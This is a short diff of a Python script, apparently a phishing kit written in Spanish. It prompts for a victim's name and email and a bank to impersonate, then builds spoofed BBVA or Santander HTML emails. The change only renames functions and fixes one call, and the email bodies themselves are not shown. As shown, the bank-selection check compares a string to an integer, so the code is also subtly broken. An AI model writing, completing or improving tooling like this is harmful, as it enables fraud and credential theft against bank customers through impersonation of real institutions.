@@ -3,7 +3,7 @@ import os
 import sys
 import smtplib
 
-def BankEs():
+def bank_es():
     #Información de la victima
     userName = input("Introduce el nombre de tu victima-->")
     bank = input("Introduce el banco que quieres suplantar-->")
@@ -12,12 +12,12 @@ def BankEs():
     
     ##HTML que se enviara a la victima
     if bank==1:
-        bbvaEs(userName,userEmail,url)
+        bbva_es(userName,userEmail,url)
     elif bank==2:
-        santanderEs()
+        santander_es(userName,userEmail,url)
 
 
-def bbvaEs(userName,userEmail,url):
+def bbva_es(userName,userEmail,url):
     ##HTML suplantacion bbva
     bbvaHtml=("""
                    <html>
@@ -1177,7 +1177,7 @@ def bbvaEs(userName,userEmail,url):
     getPath()
 
 
-def santanderEs(userName,userEmail,url,currentDate):
+def santander_es(userName,userEmail,url):
     ##HTML suplantacion santander
     santanderHtml=("""
                    
